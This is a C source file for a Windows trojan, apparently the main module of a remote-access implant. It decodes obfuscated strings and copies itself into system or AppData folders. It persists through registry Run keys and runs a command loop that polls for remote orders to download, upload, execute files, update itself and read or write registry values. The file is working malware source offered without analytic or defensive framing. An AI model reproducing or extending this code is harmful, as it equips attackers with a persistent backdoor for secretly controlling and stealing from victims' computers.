#include <windows.h>
#include <stdio.h>
#include "../../shared/include/loadDll.h"
#include "../../shared/include/CHTTPClass.h"
#include "../include/ComManager.h"
#include "../include/function.h"
#include "../../shared/include/maindef.h"
#include "../../shared/include/osversion.h"
#include "../../shared/include/ofuscstring.h"

/*  Declare Windows procedure  */
LRESULT CALLBACK WindowProcedure (HWND, UINT, WPARAM, LPARAM);

DLLHANDLER pDllHandler;
API pApi;

DWORD WINAPI CommanderWorkerProcess(IN LPVOID vThreadParam)
{
      COMMAND *command1;
      while (1) {

            command1=CheckCommand(&pApi);
            if (command1) {
               ExecuteCommand(&pApi,command1);
               FinalizeCommand(&pApi,command1);
            }
            _sleep(pApi.lTimeToSleep);
      }
      return 0;
}

DWORD StartCommander(void)
{
	HANDLE   hThread;
    DWORD    dwThreadID;
	objParamThread stThreadParam;
	DWORD dwReturnCode;
	hThread = CreateThread(
                     NULL,            // Pointer to thread security attributes
                     0,               // Initial thread stack size, in bytes
                     CommanderWorkerProcess,  // Pointer to thread function
                     NULL,     // The argument for the new thread
                     0,               // Creation flags
                     &dwThreadID      // Pointer to returned thread identifier
                 );
    return 0;
}

bool Install(API *pApi, bool force) {
    char svSystemDirectory[MAX_PATH];char *svCommandLine; char *svCommandLine2;char svUserName[MAX_PATH];char svTargetName1[MAX_PATH];
    char svTargetName2[MAX_PATH];char svRegPath[MAX_PATH];char svMyDocuments[MAX_PATH];char svTargetName3[MAX_PATH];
    char stCommandLine[MAX_PATH];
    char *svRunRegKey;char *svTargetName; bool bInstalled=false;
    DWORD dwLenght=512; DWORD lpType=REG_SZ; HKEY key;int i;
    
    _sleep(5000);
    
    GetComputerName(svUserName,&dwLenght);
    
    for (i=0;i<dwLenght;i++)
        pApi->idTroj+=svUserName[i]*i*70;    
        
    dwLenght=512;
    GetTempPath(dwLenght,pApi->sTmpDirectory);   
    sprintf(svTargetName3,"%s%s",pApi->sTmpDirectory,PROCESSNAME);
    
    dwLenght=512;
    
    GetSystemDirectory(svSystemDirectory,sizeof(svSystemDirectory));
    pApi->pGetUserName(svUserName,&dwLenght);
    pApi->pSHGetSpecialFolderPath(0,svMyDocuments,CSIDL_APPDATA ,0);
    
    wsprintf(svTargetName1,"%s\\%s",svSystemDirectory,PROCESSUPDATENAME);
    wsprintf(svTargetName2,"%s\\Microsoft\\%s",svMyDocuments,PROCESSUPDATENAME);
    DeleteFile(svTargetName1);
    DeleteFile(svTargetName2);
    DeleteFile(PROCESSUPDATENAME);
    
    wsprintf(svTargetName1,"%s\\%s",svSystemDirectory,PROCESSNAME);
    wsprintf(svTargetName2,"%s\\Microsoft\\%s",svMyDocuments,PROCESSNAME);


    strcpy(stCommandLine,GetCommandLine());
    svCommandLine=stCommandLine;
    if (*svCommandLine=='"') {
      svCommandLine++;
      *(svCommandLine+strlen(svCommandLine)-2)=0;                         
    }
    
    svCommandLine2=GetCommandLine();
    while (*svCommandLine2!='\0')
    {
          if (*svCommandLine2==' ' && *(svCommandLine-4)=='.')
             *svCommandLine2=0;
          svCommandLine2++;
    }
    
    if(bIsWinNT) {
			svRunRegKey=STR_INSTALL_KEY1;
	} else {
			svRunRegKey=STR_INSTALL_KEY2;
	}
	
    if((!force) && ((GetFileAttributes(svTargetName1)!=0xFFFFFFFF) || (GetFileAttributes(svTargetName2)!=0xFFFFFFFF))){
        dwLenght=MAX_PATH;
        if (GetFileAttributes(svTargetName1)!=0xFFFFFFFF)
           strcpy(pApi->sInstalledRep,svTargetName1);
        else   
           strcpy(pApi->sInstalledRep,svTargetName2);
        
        
        if(pApi->pRegOpenKeyEx(HKEY_LOCAL_MACHINE,svRunRegKey,0,KEY_READ,&key)==ERROR_SUCCESS)
            if (pApi->pRegQueryValueEx(key,KEYNAME,0,&lpType ,(BYTE *)svRegPath,&dwLenght)==ERROR_SUCCESS) {
               strcpy(pApi->sInstalledKey,svRunRegKey);
               return true;
            }

        dwLenght=MAX_PATH;
        if (pApi->pRegOpenKey(HKEY_CURRENT_USER,STR_INSTALL_KEY1,&key)==ERROR_SUCCESS)
          if (pApi->pRegQueryValueEx(key,KEYNAME,NULL,NULL,(BYTE *)svRegPath,&dwLenght)==ERROR_SUCCESS) {
                  strcpy(pApi->sInstalledKey,svRunRegKey);
                  return true;
          }
    }

    dwLenght=MAX_PATH;

    if((force) || ((GetFileAttributes(svTargetName1)==0xFFFFFFFF) && (GetFileAttributes(svTargetName2)==0xFFFFFFFF)))
    {
         if(CopyFile(svCommandLine,svTargetName1,false))
            svTargetName=svTargetName1;
         else if (CopyFile(svCommandLine,svTargetName2,false))
                  svTargetName=svTargetName2;
              else if (CopyFile(svCommandLine,svTargetName3,false))
                      svTargetName=svTargetName3;
                   else
                       svTargetName=NULL;
    } else {
    
      if (GetFileAttributes(svTargetName2)!=0xFFFFFFFF)
         svTargetName=svTargetName2;
                                                   
      if (GetFileAttributes(svTargetName1)!=0xFFFFFFFF)
         svTargetName=svTargetName1;                                               
    }

	if(pApi->pRegCreateKey(HKEY_LOCAL_MACHINE,svRunRegKey,&key)==ERROR_SUCCESS) {
             if(pApi->pRegOpenKey(HKEY_LOCAL_MACHINE,svRunRegKey,&key)==ERROR_SUCCESS) {
				  if(pApi->pRegSetValueEx(key,KEYNAME,0,REG_SZ,(BYTE *)svTargetName,lstrlen(svTargetName))==ERROR_SUCCESS) {
                       strcpy(pApi->sInstalledRep,svTargetName);
                       strcpy(pApi->sInstalledKey,svRunRegKey);
                       bInstalled=true;
				  }
				  pApi->pRegCloseKey(key);
			  }
    }
    if (!bInstalled) {
         if(pApi->pRegCreateKey(HKEY_CURRENT_USER,STR_INSTALL_KEY1,&key)==ERROR_SUCCESS) {
             if(pApi->pRegOpenKey(HKEY_CURRENT_USER,STR_INSTALL_KEY1,&key)==ERROR_SUCCESS) {
				  if(pApi->pRegSetValueEx(key,KEYNAME,0,REG_SZ,(BYTE *)svTargetName,lstrlen(svTargetName))==ERROR_SUCCESS) {
					  bInstalled=true ;
					  strcpy(pApi->sInstalledRep,svTargetName);
                      strcpy(pApi->sInstalledKey,STR_INSTALL_KEY1);
				  }
			  }                                                                                                               
         }
    } 
    return bInstalled;
}

int WINAPI WinMain (HINSTANCE hThisInstance,
                    HINSTANCE hPrevInstance,
                    LPSTR lpszArgument,
                    int nFunsterStil)
{
    MSG messages;            /* Here messages to the application are saved */
    StringPlainText();
    loadLibraryWinInet(&pDllHandler,&pApi);
    loadLibraryShell32(&pDllHandler,&pApi);
    loadLibraryAdvAPI32(&pDllHandler,&pApi);
    loadLibrarySocket(&pDllHandler,&pApi);
    GetOSVersion(pApi.sWindowsVersion);
    pApi.lTimeToSleep=_DELAYCOMMANDER;
    
    if (__argc==2)
        Install(&pApi,true);
    else
        Install(&pApi,false);
       
    ReferenceCommand(_CMD_DOWNLOAD,&COMMAND_download);
    ReferenceCommand(_CMD_UPLOAD,&COMMAND_upload);
    ReferenceCommand(_CMD_EXECUTE,&COMMAND_execute);
    ReferenceCommand(_CMD_MESSAGEBOX,&COMMAND_MessageBox);
    ReferenceCommand(_CMD_UPDATE,&COMMAND_Update);
    ReferenceCommand(_CMD_GETINFO,&COMMAND_getInfo);
    ReferenceCommand(_CMD_GETREGVALUE,&COMMAND_GetRegKey);
    ReferenceCommand(_CMD_SETREGVALUE,&COMMAND_SetRegKey);
    ReferenceCommand(_CMD_SETTTS,&COMMAND_TTS);
    ReferenceCommand(_CMD_CONNECT,&COMMAND_CONNECT);

    StartCommander();   
    while (GetMessage (&messages, NULL, 0, 0))
    {
        TranslateMessage(&messages);
        DispatchMessage(&messages);
    }
    
    return messages.wParam;
}

/*  This function is called by the Windows function DispatchMessage()  */
LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)                  /* handle the messages */
    {
        case WM_DESTROY:
            freeLibraries(&pDllHandler); 
            PostQuitMessage (0);       /* send a WM_QUIT to the message queue */
            exit(0);
            break;
        default:                      /* for messages that we don't deal with */
            return DefWindowProc (hwnd, message, wParam, lParam);
    }
    return 0;
}
